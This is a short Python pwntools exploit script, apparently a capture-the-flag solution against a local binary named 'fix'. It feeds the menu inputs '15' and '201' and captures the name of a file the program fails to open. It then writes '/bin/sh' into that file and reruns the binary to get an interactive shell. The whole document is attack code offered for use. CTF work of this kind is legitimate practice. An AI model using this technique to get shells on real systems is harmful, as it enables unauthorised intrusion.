#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"
path = "./fix"

io = process(path)

io.sendline("15")
io.sendline("201")
io.recvuntil("Can't open ")
fname = io.recvline().strip()
io.close()
print fname

with open(fname, "w") as f:
    f.write("/bin/sh\0")

io = process(path)
io.sendline("15")
io.sendline("201")

io.interactive()
